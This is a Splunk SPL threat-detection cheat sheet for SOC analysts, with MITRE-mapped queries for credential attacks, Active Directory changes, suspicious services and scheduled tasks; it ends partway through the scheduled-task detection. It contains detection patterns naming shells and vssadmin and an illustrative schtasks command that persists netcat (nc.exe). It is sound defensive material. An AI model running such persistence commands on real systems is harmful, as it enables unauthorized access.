# Splunk-SPL
# 🛡️ Splunk SPL Threat Hunting & Attack Detection Cheat Sheet

Welcome to the **Splunk SPL Threat Detection & Threat Hunting Cheat Sheet**. This repository provides production-grade, syntactically accurate Search Processing Language (SPL) queries for Security Operations Center (SOC) analysts, threat hunters, and detection engineers.

---

## 🎯 Purpose

This document provides detection logic, field mappings, attack concepts, and SOC playbooks to help security teams hunt for malicious activity, build automated alert rules, and analyze security telemetry in Splunk.

Every query in this repository includes:

* Detailed explanations of the underlying attack mechanics.
* Accurate MITRE ATT&CK technique mappings.
* Field assumptions and data source requirements.
* Detailed breakdowns of all SPL commands used.
* Practical SOC tuning, investigation, and response guidance.

---

## ⚠️ Before You Start

* **Environment-Specific Fields:** Do not copy queries blindly into production. Field names differ across log sources (e.g., Windows Security Events, Sysmon, Zeek, Palo Alto, AWS CloudTrail). Update field names to match your index schema or Common Information Model (CIM) data models.
* **Replace Placeholders:** Replace generic placeholders like `index=YOUR_INDEX` and `sourcetype=YOUR_SOURCETYPE` with your environment's specific values.
* **Validate Log Ingestion:** Verify that the required log sources (e.g., Sysmon Event ID 1, Windows Event ID 4624/4625, CloudTrail) are ingested and indexed before running these searches.
* **Time Windows:** Always limit your initial search window (e.g., `earliest=-15m latest=now` or `earliest=-24h`) to prevent excessive cluster resource consumption.
* **Threshold Tuning:** Thresholds (e.g., `where count > 10`) are baseline starting points. Tune thresholds based on your organization's environment to minimize false positives.

---

## 📚 Table of Contents

* [Data-Source Matrix](https://www.google.com/search?q=%23-data-source-matrix)
* [SPL Fundamentals Used in This Cheat Sheet](https://www.google.com/search?q=%23-spl-fundamentals-used-in-this-cheat-sheet)
* [Time-Range Best Practices](https://www.google.com/search?q=%23-time-range-best-practices)
* [Detection Engineering Framework](https://www.google.com/search?q=%23-detection-engineering-framework)
* [False Positive & Tuning Guide](https://www.google.com/search?q=%23-false-positive--tuning-guide)
* [Severity Classification Matrix](https://www.google.com/search?q=%23-severity-classification-matrix)
* [Master Investigation Playbook Workflow](https://www.google.com/search?q=%23-master-investigation-playbook-workflow)
* [BOTS v3 Compatibility & Discovery Guide](https://www.google.com/search?q=%23-bots-v3-compatibility--discovery-guide)
* [Detections](https://www.google.com/search?q=%23-detections)
* [Authentication & Credential Attacks](https://www.google.com/search?q=%23-authentication--credential-attacks)
* [Windows & Active Directory](https://www.google.com/search?q=%23-windows--active-directory)
* [PowerShell & Execution](https://www.google.com/search?q=%23-powershell--execution)
* [Malware & Endpoint Behavior](https://www.google.com/search?q=%23-malware--endpoint-behavior)
* [Network Attacks & Exfiltration](https://www.google.com/search?q=%23-network-attacks--exfiltration)
* [DNS Attacks](https://www.google.com/search?q=%23-dns-attacks)
* [Web Attacks](https://www.google.com/search?q=%23-web-attacks)
* [Linux Security](https://www.google.com/search?q=%23-linux-security)
* [Cloud & AWS Security](https://www.google.com/search?q=%23-cloud--aws-security)


* [Comprehensive MITRE ATT&CK Mapping Table](https://www.google.com/search?q=%23-comprehensive-mitre-attck-mapping-table)
* [How to Learn These Detections](https://www.google.com/search?q=%23-how-to-learn-these-detections)
* [Quick Revision Table](https://www.google.com/search?q=%23-quick-revision-table)

---

## 📊 Data-Source Matrix

| Detection Category | Primary Log Source | Common Sourcetype | Key SPL Fields Required |
| --- | --- | --- | --- |
| **Authentication** | Windows Security / Linux Auth / Azure AD | `WinEventLog:Security`, `linux_secure`, `azure:aad:signin` | `user`, `src_ip`, `action`, `EventCode`, `status` |
| **Windows & AD** | Windows Security Event Logs | `WinEventLog:Security` | `EventCode`, `TargetUserName`, `SubjectUserName`, `GroupName` |
| **Process Execution** | Microsoft Sysmon / Windows Event 4688 | `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational` | `EventCode`, `Image`, `CommandLine`, `ParentImage`, `User` |
| **PowerShell** | PowerShell Script Block Logging | `WinEventLog:Microsoft-Windows-PowerShell/Operational` | `EventCode`, `ScriptBlockText`, `Path`, `User` |
| **Network Traffic** | Firewall / Zeek / Palo Alto / Sysmon Net | `pan:traffic`, `zeek:conn`, `XmlWinEventLog:.../Sysmon` | `src_ip`, `dest_ip`, `dest_port`, `bytes_out`, `bytes_in` |
| **DNS Activity** | Windows DNS Server / Zeek DNS / Splunk Stream | `WinDNS`, `zeek:dns`, `stream:dns` | `query`, `query_length`, `src_ip`, `record_type` |
| **Web Server** | Apache / Nginx / IIS Logs / WAF | `access_combined`, `iis`, `aws:waf` | `src_ip`, `uri_path`, `status`, `http_user_agent`, `method` |
| **Linux Security** | Linux Auditd / Syslog | `linux_secure`, `auditd` | `user`, `process`, `command`, `src_ip`, `app` |
| **Cloud (AWS)** | AWS CloudTrail Logs | `aws:cloudtrail` | `eventName`, `eventSource`, `userIdentity.arn`, `sourceIPAddress` |

---

## 🧩 SPL Fundamentals Used in This Cheat Sheet

* **Search Terms & Boolean Operators (`AND`, `OR`, `NOT`)**
* *Purpose:* Narrows down events matching specific string patterns.
* *Syntax:* `index=security ("failed" OR "failure") NOT user="system"`
* *Example:* `index=main EventCode=4625 AND TargetUserName="Administrator"`
* *Security Use Case:* Filtering noise out of raw authentication logs.


* **`stats`**
* *Purpose:* Calculates aggregate statistics (counts, averages, distinct counts) grouped by fields.
* *Syntax:* `... | stats count, dc(dest_ip) as target_count by src_ip`
* *Example:* `... | stats count by user, src_ip`
* *Security Use Case:* Aggregating failed logins to spot brute-force attempts.


* **`eventstats`**
* *Purpose:* Calculates aggregate statistics and appends the result as a new field to every individual event.
* *Syntax:* `... | eventstats avg(bytes_out) as avg_bytes by src_ip`
* *Example:* `... | eventstats count as user_total by user`
* *Security Use Case:* Comparing an individual connection's size against the user's historical average.


* **`streamstats`**
* *Purpose:* Calculates running statistics as events are processed in time-series order.
* *Syntax:* `... | streamstats current=f last(_time) as prev_time by src_ip`
* *Example:* `... | streamstats window=5 avg(bytes) as rolling_avg`
* *Security Use Case:* Measuring time gaps between sequential HTTP requests to detect automated C2 beacons.


* **`eval`**
* *Purpose:* Calculates expressions, creates new fields, or transforms existing field values.
* *Syntax:* `... | eval MB = bytes / 1024 / 1024`
* *Example:* `... | eval is_admin = if(user=="admin", "Yes", "No")`
* *Security Use Case:* Converting bytes into megabytes or normalizing field values.


* **`where`**
* *Purpose:* Filters results using boolean expressions or field comparisons. Case-sensitive.
* *Syntax:* `... | where field_a > field_b`
* *Example:* `... | where failed_attempts >= 10`
* *Security Use Case:* Dropping aggregate count rows below a specific threat threshold.


* **`table` & `fields**`
* *Purpose:* Formats output into specific columns (`table`) or keeps/removes specific fields in memory (`fields`).
* *Syntax:* `... | table _time, user, src_ip, action`
* *Example:* `... | fields + _time, CommandLine, Image`
* *Security Use Case:* Producing readable SOC investigation summaries.


* **`rename`**
* *Purpose:* Renames fields for display or CIM compatibility.
* *Syntax:* `... | rename TargetUserName as user, IpAddress as src_ip`
* *Example:* `... | rename count as total_alerts`
* *Security Use Case:* Standardizing vendor-specific log fields into clean table headings.


* **`sort`**
* *Purpose:* Orders results by specified fields (ascending by default, descending with `-`).
* *Syntax:* `... | sort - count`
* *Example:* `... | sort 10 - total_bytes`
* *Security Use Case:* Displaying the top 10 worst offenders at the top of the report.


* **`dedup`**
* *Purpose:* Removes duplicate events that share identical values for specified fields.
* *Syntax:* `... | dedup user, src_ip`
* *Example:* `... | dedup TargetFilename`
* *Security Use Case:* Displaying unique IOC instances without repeating duplicate log entries.


* **`rex`**
* *Purpose:* Extracts new fields from raw log text using Regular Expressions (Regex).
* *Syntax:* `... | rex field=_raw "from (?<src_ip>\d+\.\d+\.\d+\.\d+)"`
* *Example:* `... | rex field=CommandLine "(?<sqli_payload>UNION SELECT.*)"`
* *Security Use Case:* Parsing custom log formats that lack automated field extraction.


* **`bin` / `bucket**`
* *Purpose:* Quantizes numerical values or timestamps into discrete time intervals or buckets.
* *Syntax:* `... | bin _time span=1h`
* *Example:* `... | bucket _time span=15m`
* *Security Use Case:* Grouping network events into 15-minute windows for time-series charting.


* **`timechart`**
* *Purpose:* Creates statistical aggregation tables formatted for time-series visualization.
* *Syntax:* `... | timechart span=1h count by sourcetype`
* *Example:* `... | timechart span=5m sum(bytes_out) by src_ip`
* *Security Use Case:* Visualizing spikes in outbound data transfers over time.


* **`transaction`**
* *Purpose:* Groups events that belong to the same transaction based on shared fields and time limits.
* *Syntax:* `... | transaction host maxspan=30m maxpause=5m`
* *Example:* `... | transaction user startswith="login" endswith="logout"`
* *Security Use Case:* Tracking entire user sessions from initial login to logoff.


* **`lookup`**
* *Purpose:* Matches search fields against an external CSV or KV-store reference table to add contextual data.
* *Syntax:* `... | lookup threat_intel_ips ip as src_ip OUTPUT threat_category`
* *Example:* `... | lookup asset_inventory host as Computer OUTPUT owner, department`
* *Security Use Case:* Enriching internal IP addresses with host ownership and department metadata.



---

## ⏳ Time-Range Best Practices

| Search Type | Recommended Time Range | SPL Time Modifier | Rationale |
| --- | --- | --- | --- |
| **Real-Time Alert Rule** | 5 to 15 Minutes | `earliest=-15m latest=now` | Keeps search runtime low and minimizes cluster overhead while alerting on near-real-time events. |
| **Hourly Summary Rule** | 1 Hour | `earliest=-60m@m latest=@m` | Standard window for aggregating baseline behaviors like data transfer volumes or DNS counts. |
| **Daily Threat Hunt** | 24 Hours | `earliest=-24h latest=now` | Detects slow-and-low attacks, password spraying, or daily off-hours anomalies. |
| **Historical Baseline / Audit** | 7 to 30 Days | `earliest=-30d@d latest=@d` | Establishes statistical baselines to identify rare process executions or new user domains. |

---

## ⚙️ Detection Engineering Framework

To turn raw logs into actionable alerts, follow this detection lifecycle:

```text
  Raw Security Telemetry
            │
            ▼
    [ SPL Logic Search ] ──► (Filter events using indexes and log patterns)
            │
            ▼
   [ Data Aggregation ] ──► (Group by user/src/dest using stats or timechart)
            │
            ▼
   [ Threshold Analytics ] ─► (Apply mathematical & operational bounds via where)
            │
            ▼
   [ False Positive Tuning ] ► (Exclude authorized service accounts and systems)
            │
            ▼
   [ Alert Generation ] ───► (Create a Splunk Alert / Enterprise Security Notable)
            │
            ▼
 [ Investigation Playbook ] ─► (SOC Analysts validate, isolate, and contain)

```

---

## 🛡️ False Positive & Tuning Guide

Common sources of false positives and how to address them:

* **Vulnerability Scanners (e.g., Qualys, Nessus, Tenable):** Generate vast amounts of simulated web attacks and port scans. *Tuning:* Create a Splunk Lookup table `scanner_ips.csv` and exclude them from alerting queries (`... NOT [| inputlookup scanner_ips.csv]`).
* **Service & Administrative Accounts:** Automated scripts cause regular authentication failures when changing passwords. *Tuning:* Filter out service accounts using naming conventions (`... NOT TargetUserName="svc_*" NOT TargetUserName="*$"`).
* **Software Deployment Tools (e.g., SCCM, PDQ Deploy, Ansible):** Deploy scripts that mimic suspicious command execution. *Tuning:* Filter by expected parent processes or administrative origin IPs.
* **Backup Systems (e.g., Veeam, Commvault):** Trigger high-volume outbound network traffic or shadow copy calls. *Tuning:* Suppress exfiltration alerts for designated backup network segments during maintenance windows.

---

## 🚦 Severity Classification Matrix

| Severity Level | Color | Response SLA | Criteria / Impact |
| --- | --- | --- | --- |
| **Critical** | 🚨 Red | `< 15 Mins` | Immediate threat to core infrastructure (e.g., Ransomware execution, Domain Admin compromise, Active C2 channel). |
| **High** | 🟠 Orange | `< 1 Hour` | Confirmed malicious activity with potential lateral movement (e.g., LSASS memory dump, Kerberoasting, Unauthorized SSH access). |
| **Medium** | 🟡 Yellow | `< 4 Hours` | Suspicious behavior requiring analyst verification (e.g., Password spray threshold met, Encoded PowerShell, Security log cleared). |
| **Low / Info** | 🟢 Green | `< 24 Hours` | Minor anomaly or policy violation (e.g., Off-hours successful login, Single failed login to a sensitive system). |

---

## 🔍 Master Investigation Playbook Workflow

```text
  [ Alert Triggered ]
           │
           ▼
1. Validate Alert Accuracy
   └── Verify query fired correctly; rule out false-positive sources (scanners, maintenance).
           │
           ▼
2. Scope Affected Assets & Identities
   └── Identify target hosts (dest), source devices (src), and impacted accounts (user).
           │
           ▼
3. Construct Event Timeline
   └── Search 30 minutes before and after the event time window for context.
           │
           ▼
4. Correlate Across Data Sources
   └── Match endpoint process logs with network traffic, proxy logs, and auth records.
           │
           ▼
5. Assess Threat Level & Impact
   └── Determine if the activity succeeded or was blocked by host/network defenses.
           │
           ▼
6. Contain, Eradicate & Document
   └── Isolate host, revoke compromised tokens, block malicious IPs, log ticket notes.

```

---

## 🤖 BOTS v3 Compatibility & Discovery Guide

If you are using **Splunk Boss of the SOC v3 (BOTS v3)**, note that data is indexed under historical timestamps (primarily 2018–2019) and uses specific index and sourcetype names.

### Safe Discovery Searches

#### 1. Discover Available Indexes

```spl
| tstats count where index=* by index

```

#### 2. Discover Sourcetypes in the BOTS v3 Index

```spl
| tstats count where index=botsv3 by sourcetype

```

#### 3. Inspect Raw Events & Field Schemas

```spl
index=botsv3 sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
| head 10

```

#### 4. Analyze Field Summaries for Specific Sourcetypes

```spl
index=botsv3 sourcetype="WinEventLog:Security"
| fieldsummary
| table field, count, distinct_count, values

```

---

## 🎯 Detections

### 🔐 Authentication & Credential Attacks

#### 1. Account Brute-Force Detection

##### 🎯 What It Detects

High volumes of failed login attempts targeting a single account from a single source IP address within a short timeframe.

##### 🧠 Attack Concept

Attackers attempt to guess valid credentials by running automated tools against authentication endpoints.

* **MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

##### 📥 Required Log Source

* **Log Source:** Windows Security Logs / Linux Secure Logs / SSO Logs
* **Example Sourcetype:** `WinEventLog:Security`, `linux_secure`, `azure:aad:signin`
* **Key Fields:** `user`, `src_ip`, `action`, `EventCode`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX (sourcetype="WinEventLog:Security" EventCode=4625) OR (sourcetype="linux_secure" "Failed password")
| eval target_user = coalesce(user, TargetUserName)
| eval source_ip = coalesce(src_ip, IpAddress)
| stats count as failed_attempts, min(_time) as first_seen, max(_time) as last_seen by target_user, source_ip
| where failed_attempts >= 10
| eval duration_sec = last_seen - first_seen
| sort - failed_attempts

```

##### 🔍 SPL Command Breakdown

* `index=YOUR_INDEX ...`: Filters authentication failure events across Windows and Linux logs.
* `eval target_user = coalesce(...)`: Normalizes variable field names for user accounts into `target_user`.
* `eval source_ip = coalesce(...)`: Normalizes variable field names for source IPs into `source_ip`.
* `stats count ... by target_user, source_ip`: Aggregates the total failure counts per unique user and IP combination.
* `where failed_attempts >= 10`: Limits results to instances meeting or exceeding the 10-failure threshold.
* `eval duration_sec = last_seen - first_seen`: Calculates the exact time span of the attack.

##### 📊 Example Result *(Illustrative Example)*

| target_user | source_ip | failed_attempts | duration_sec |
| --- | --- | --- | --- |
| Administrator | 192.168.1.150 | 87 | 14 |
| jsmith | 10.0.4.12 | 12 | 120 |

##### 🚨 Why This Is Suspicious

A high frequency of failed logins indicates an automated dictionary or brute-force attack.

##### ⚙️ SOC Tuning

* Increase threshold for high-volume environments.
* Filter out external vulnerability scanners or misconfigured internal application servers.

##### 🕵️ Investigation Tips

1. Check if a successful login occurred from `source_ip` shortly after the failures.
2. Query geo-location metadata for `source_ip`.
3. Check if `target_user` is a privileged domain account.

##### 🛡️ Recommended Response

* Lock the targeted account if lockout policies haven't triggered.
* Block the offending source IP at the firewall or perimeter Gateway.

---

#### 2. Password Spraying Attack

##### 🎯 What It Detects

A single source IP attempting to log into many distinct user accounts using a small number of password attempts per account.

##### 🧠 Attack Concept

Avoids account lockouts by testing a few common passwords (e.g., `Winter2026!`) across hundreds of distinct accounts.

* **MITRE ATT&CK:** T1110.003 — Brute Force: Password Spraying

##### 📥 Required Log Source

* **Log Source:** Active Directory / Azure AD Sign-in Logs / Okta Logs
* **Example Sourcetype:** `azure:aad:signin`, `WinEventLog:Security`
* **Key Fields:** `user`, `src_ip`, `status`, `EventCode`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX (EventCode=4625 OR sourcetype="azure:aad:signin")
| eval target_user = coalesce(user, TargetUserName, userPrincipalName)
| eval source_ip = coalesce(src_ip, IpAddress, clientIp)
| stats dc(target_user) as distinct_targets, count as total_failures by source_ip
| where distinct_targets >= 10 AND (total_failures / distinct_targets) <= 3
| sort - distinct_targets

```

##### 🔍 SPL Command Breakdown

* `stats dc(target_user) as distinct_targets ...`: Calculates the distinct count (`dc`) of unique target accounts attacked by a single source IP.
* `where distinct_targets >= 10 AND ...`: Isolates IPs that targeted at least 10 unique users with low failure-per-user ratios.

##### 📊 Example Result *(Illustrative Example)*

| source_ip | distinct_targets | total_failures |
| --- | --- | --- |
| 185.220.101.5 | 142 | 150 |

##### 🚨 Why This Is Suspicious

Authenticating against numerous accounts from a single source within a short window is characteristic of automated password spraying tools.

##### ⚙️ SOC Tuning

* Whitelist internal proxy IPs, NAT gateways, and SSO load balancers that group legitimate user traffic under a single IP.

##### 🕵️ Investigation Tips

1. Identify any successful logons from `source_ip` during or after the spray window.
2. Verify if the targeted accounts share specific password policy constraints.

##### 🛡️ Recommended Response

* Require password resets for all targeted accounts that showed a subsequent successful login.
* Apply conditional access policy updates to block `source_ip`.

---

#### 3. Multiple Failed Logins Followed by Success

##### 🎯 What It Detects

A series of authentication failures for a user account followed immediately by a successful login from the same source IP.

##### 🧠 Attack Concept

Indicates a successful brute-force or password-guessing attempt where the attacker successfully identifies the correct password.

* **MITRE ATT&CK:** T1110 — Brute Force

##### 📥 Required Log Source

* **Log Source:** Windows Security Logs / Linux Security Logs / VPN Logs
* **Example Sourcetype:** `WinEventLog:Security`
* **Key Fields:** `TargetUserName`, `IpAddress`, `EventCode` (4625 = Fail, 4624 = Success)

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="WinEventLog:Security" (EventCode=4625 OR EventCode=4624)
| eval action = if(EventCode=4624, "Success", "Failure")
| stats count(eval(action="Failure")) as fails, count(eval(action="Success")) as successes by TargetUserName, IpAddress
| where fails >= 5 AND successes >= 1
| table TargetUserName, IpAddress, fails, successes

```

##### 🔍 SPL Command Breakdown

* `eval action = if(...)`: Maps EventCode 4624 to "Success" and 4625 to "Failure".
* `stats count(eval(action="Failure")) ...`: Aggregates separate failure and success counts for every user and IP pairing.
* `where fails >= 5 AND successes >= 1`: Filters for instances where a successful login was preceded by 5 or more failures.

##### 📊 Example Result *(Illustrative Example)*

| TargetUserName | IpAddress | fails | successes |
| --- | --- | --- | --- |
| msmith | 203.0.113.45 | 18 | 1 |

##### 🚨 Why This Is Suspicious

Indicates a brute-force attack that successfully compromised the account credentials.

##### ⚙️ SOC Tuning

* Tune out user lockouts caused by password changes on mobile devices by adjusting the failure count window.

##### 🕵️ Investigation Tips

1. Review actions taken by `TargetUserName` immediately following the successful login event.
2. Verify if multi-factor authentication (MFA) was prompted and completed.

##### 🛡️ Recommended Response

* Revoke active session tokens for the account.
* Force a password reset and enable MFA enforcement.

---

#### 4. Suspicious Successful Login From New Source IP

##### 🎯 What It Detects

A successful login originating from an IP address that has not been observed for that user within the previous 30 days.

##### 🧠 Attack Concept

Detects unauthorized access using compromised credentials from unfamiliar adversary infrastructure.

* **MITRE ATT&CK:** T1078 — Valid Accounts

##### 📥 Required Log Source

* **Log Source:** Azure AD / Okta / VPN Logs / Windows Security Logs
* **Example Sourcetype:** `azure:aad:signin`, `WinEventLog:Security`
* **Key Fields:** `user`, `src_ip`, `action`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX action="success"
| eval user = lower(user), src_ip = coalesce(src_ip, IpAddress)
| stats min(_time) as first_seen, max(_time) as last_seen by user, src_ip
| eventstats min(first_seen) as user_first_seen by user
| where first_seen > relative_time(now(), "-1d") AND user_first_seen < relative_time(now(), "-7d")
| table user, src_ip, first_seen

```

##### 🔍 SPL Command Breakdown

* `eventstats min(first_seen) as user_first_seen by user`: Determines when the user was first seen in the log dataset.
* `where first_seen > relative_time(...)`: Isolates new IP pairings seen in the past 24 hours for users with a 7+ day baseline.

##### 📊 Example Result *(Illustrative Example)*

| user | src_ip | first_seen |
| --- | --- | --- |
| bwayne | 198.51.100.77 | 2026-08-31 14:22:01 |

##### 🚨 Why This Is Suspicious

Initial access using compromised credentials often originates from new IP addresses or proxy networks.

##### ⚙️ SOC Tuning

* Exclude corporate VPN IP ranges and known remote worker subnets.

##### 🕵️ Investigation Tips

1. Check the geo-location of the IP address.
2. Contact the user to confirm whether they initiated the connection.

##### 🛡️ Recommended Response

* Prompt the user for MFA re-authentication.
* Terminate suspicious active sessions if unverified.

---

#### 5. Impossible Travel / Velocity Anomaly

##### 🎯 What It Detects

Sequential successful logins for a single user from two distinct geographic locations within a timeframe that is physically impossible to travel between.

##### 🧠 Attack Concept

Indicates credential sharing or token theft/replay across distant infrastructure.

* **MITRE ATT&CK:** T1078 — Valid Accounts

##### 📥 Required Log Source

* **Log Source:** Cloud Identity Provider (Azure AD / Okta)
* **Example Sourcetype:** `azure:aad:signin`
* **Key Fields:** `userPrincipalName`, `clientIp`, `location`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="azure:aad:signin" status.errorCode=0
| sort 0 userPrincipalName, _time
| streamstats current=f last(_time) as prev_time, last(location) as prev_loc, last(clientIp) as prev_ip by userPrincipalName
| eval time_diff_hrs = (_time - prev_time) / 3600
| where location != prev_loc AND time_diff_hrs < 2 AND time_diff_hrs > 0
| table _time, userPrincipalName, prev_loc, location, prev_ip, clientIp, time_diff_hrs

```

##### 🔍 SPL Command Breakdown

* `streamstats current=f last(...) by userPrincipalName`: Retrieves the location, IP, and timestamp of the user's *previous* login event.
* `eval time_diff_hrs = ...`: Converts time gap between logins into hours.
* `where location != prev_loc AND time_diff_hrs < 2`: Flags logins from different locations occurring less than 2 hours apart.

##### 📊 Example Result *(Illustrative Example)*

| userPrincipalName | prev_loc | location | prev_ip | clientIp | time_diff_hrs |
| --- | --- | --- | --- | --- | --- |
| alice@company.com | US-NY | FR-PAR | 1.2.3.4 | 5.6.7.8 | 0.45 |

##### 🚨 Why This Is Suspicious

A user cannot physically travel between distant geographic regions within minutes.

##### ⚙️ SOC Tuning

* Filter out VPN connections that route user traffic through distant gateways.

##### 🕵️ Investigation Tips

1. Verify if either IP belongs to a commercial VPN provider.
2. Check if the user logged in using different devices.

##### 🛡️ Recommended Response

* Revoke active user sessions and reset credentials.

---

#### 6. Kerberoasting Attack Detection

##### 🎯 What It Detects

Requests for Active Directory Kerberos service tickets (TGS) utilizing weak encryption algorithms (RC4 / `0x17`).

##### 🧠 Attack Concept

Attackers request TGS tickets for Service Principal Names (SPNs) to crack the service account password offline.

* **MITRE ATT&CK:** T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting

##### 📥 Required Log Source

* **Log Source:** Active Directory Domain Controller Security Logs
* **Example Sourcetype:** `WinEventLog:Security`
* **Key Fields:** `EventCode` (4769), `TicketOptions`, `TicketEncryptionType`, `ServiceName`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="WinEventLog:Security" EventCode=4769 TicketEncryptionType=0x17 ServiceName!="*$"
| stats count, values(ServiceName) as target_services by TargetUserName, IpAddress
| where count > 3

```

##### 🔍 SPL Command Breakdown

* `EventCode=4769`: Windows Kerberos service ticket request event.
* `TicketEncryptionType=0x17`: Identifies legacy, weak RC4-HMAC encryption.
* `ServiceName!="*$"`: Excludes standard computer account service tickets.

##### 📊 Example Result *(Illustrative Example)*

| TargetUserName | IpAddress | count | target_services |
| --- | --- | --- | --- |
| bad_actor | 10.0.1.50 | 12 | MSSQL/db1.domain.local, HTTP/web.domain.local |

##### 🚨 Why This Is Suspicious

Normal operations request AES encryption; mass RC4 requests for service accounts indicate Kerberoasting.

##### ⚙️ SOC Tuning

* Whitelist legacy application accounts that require RC4.

##### 🕵️ Investigation Tips

1. Inspect `ServiceName` entries to identify targeted service accounts.
2. Check if targeted accounts have high privileges (e.g., Domain Admins).

##### 🛡️ Recommended Response

* Rotate passwords for impacted service accounts to complex 25+ character values.

---

### 🪟 Windows & Active Directory

#### 7. Windows Local Account Creation

##### 🎯 What It Detects

Creation of a new local user account on a Windows endpoint or Domain Controller.

##### 🧠 Attack Concept

Adversaries create local accounts to maintain persistent access to compromised endpoints.

* **MITRE ATT&CK:** T1136.001 — Create Account: Local Account

##### 📥 Required Log Source

* **Log Source:** Windows Security Event Log
* **Example Sourcetype:** `WinEventLog:Security`
* **Key Fields:** `EventCode` (4720), `SubjectUserName`, `TargetUserName`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="WinEventLog:Security" EventCode=4720
| table _time, ComputerName, SubjectUserName, TargetUserName, SAMAccountName

```

##### 🔍 SPL Command Breakdown

* `EventCode=4720`: Windows event ID for local or domain user account creation.
* `table ...`: Formats the creation event details into a clear table.

##### 📊 Example Result *(Illustrative Example)*

| _time | ComputerName | SubjectUserName | TargetUserName |
| --- | --- | --- | --- |
| 2026-08-31 10:11 | WORKSTATION01 | local_admin | backdoor_user |

##### 🚨 Why This Is Suspicious

Unscheduled local account creation on workstations can indicate unauthorized persistence.

##### ⚙️ SOC Tuning

* Exclude authorized IT deployment tools and automated provisioning scripts.

##### 🕵️ Investigation Tips

1. Identify the user (`SubjectUserName`) who created the account.
2. Determine if the new account was added to administrative groups.

##### 🛡️ Recommended Response

* Disable the newly created account pending IT review.

---

#### 8. Account Added to Privileged Domain Group

##### 🎯 What It Detects

Addition of a user account to critical administrative groups (e.g., Domain Admins, Enterprise Admins, Administrators).

##### 🧠 Attack Concept

Adversaries grant elevated privileges to compromised accounts to maintain persistent administrative control over Active Directory.

* **MITRE ATT&CK:** T1098 — Account Manipulation

##### 📥 Required Log Source

* **Log Source:** Windows Active Directory Security Event Logs
* **Example Sourcetype:** `WinEventLog:Security`
* **Key Fields:** `EventCode` (4728, 4732, 4756), `SubjectUserName`, `TargetUserName`, `GroupName`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="WinEventLog:Security" (EventCode=4728 OR EventCode=4732 OR EventCode=4756)
| search GroupName="*Admin*" OR GroupName="*Schema*" OR GroupName="*Account Operators*"
| table _time, ComputerName, EventCode, SubjectUserName, TargetUserName, GroupName

```

##### 🔍 SPL Command Breakdown

* `EventCode=4728 OR 4732 OR 4756`: Event IDs indicating user addition to global, local, or universal security groups.
* `search GroupName="*Admin*"`: Filters specifically for elevated group additions.

##### 📊 Example Result *(Illustrative Example)*

| _time | SubjectUserName | TargetUserName | GroupName |
| --- | --- | --- | --- |
| 2026-08-31 11:05 | compromised_user | attacker_acct | Domain Admins |

##### 🚨 Why This Is Suspicious

Unauthorized expansion of domain privileges provides full control over domain infrastructure.

##### ⚙️ SOC Tuning

* Cross-reference against approved change management tickets.

##### 🕵️ Investigation Tips

1. Verify if an approved Change Request exists for this group modification.
2. Review actions performed by `SubjectUserName` around the event timestamp.

##### 🛡️ Recommended Response

* Remove the user from the privileged group immediately.

---

#### 9. Suspicious Windows Service Creation

##### 🎯 What It Detects

Creation of a new system service executing suspicious commands or running from temporary directories.

##### 🧠 Attack Concept

Adversaries use Windows services to execute payloads at system boot for persistence and privilege escalation.

* **MITRE ATT&CK:** T1543.003 — Create or Modify System Process: Windows Service

##### 📥 Required Log Source

* **Log Source:** Windows System Event Log / Sysmon
* **Example Sourcetype:** `WinEventLog:System` (EventCode 7045) or Sysmon (EventCode 13)
* **Key Fields:** `EventCode`, `ServiceName`, `ImagePath`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="WinEventLog:System" EventCode=7045
| search ImagePath="*AppData*" OR ImagePath="*Temp*" OR ImagePath="*cmd.exe*" OR ImagePath="*powershell.exe*" OR ImagePath="*vssadmin*"
| table _time, ComputerName, ServiceName, ImagePath, ServiceType

```

##### 🔍 SPL Command Breakdown

* `EventCode=7045`: Logs new service installation events.
* `search ImagePath="*AppData*"...`: Filters for services running from non-standard binary locations or invoking command shells.

##### 📊 Example Result *(Illustrative Example)*

| ComputerName | ServiceName | ImagePath |
| --- | --- | --- |
| DB-SERVER01 | UpdaterSvc | C:\Users\Public\Temp\update.exe |

##### 🚨 Why This Is Suspicious

Legitimate Windows services rarely run directly out of user profile paths or execute raw command shells.

##### ⚙️ SOC Tuning

* Filter out legitimate administrative software deployments (e.g., EDR updates, backup agents).

##### 🕵️ Investigation Tips

1. Retrieve the service binary file from the host for analysis.
2. Identify the process that created the service via Sysmon or Event 4688 logs.

##### 🛡️ Recommended Response

* Stop and delete the service. Quarantine the service binary.

---

#### 10. Scheduled Task Creation via Command Line

##### 🎯 What It Detects

Creation of a Windows scheduled task using `schtasks.exe` or PowerShell cmdlets.

##### 🧠 Attack Concept

Scheduled tasks are commonly created by malware and attackers to maintain persistent access or execute scheduled payloads.

* **MITRE ATT&CK:** T1053.005 — Scheduled Task/Job: Scheduled Task

##### 📥 Required Log Source

* **Log Source:** Microsoft Sysmon / Windows Event 4688 / Security Event 4698
* **Example Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`, `WinEventLog:Security`
* **Key Fields:** `EventCode` (1 or 4698), `CommandLine`, `Image`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX (sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*schtasks.exe") OR (sourcetype="WinEventLog:Security" EventCode=4698)
| search CommandLine="*/create*" OR EventCode=4698
| table _time, Computer, User, Image, CommandLine, TaskName

```

##### 🔍 SPL Command Breakdown

* `Image="*schtasks.exe"`: Identifies process execution of the command-line task scheduler.
* `CommandLine="*/create*"`: Isolates task creation arguments.

##### 📊 Example Result *(Illustrative Example)*

| Computer | User | CommandLine |
| --- | --- | --- |
| DESKTOP-882 | SYSTEM | schtasks /create /tn "Update" /tr "C:\Temp\nc.exe" /sc minute |

##### 🚨 Why This Is Suspicious

Scheduled tasks pointing to temp paths or executing command shells indicate persistence mechanisms.

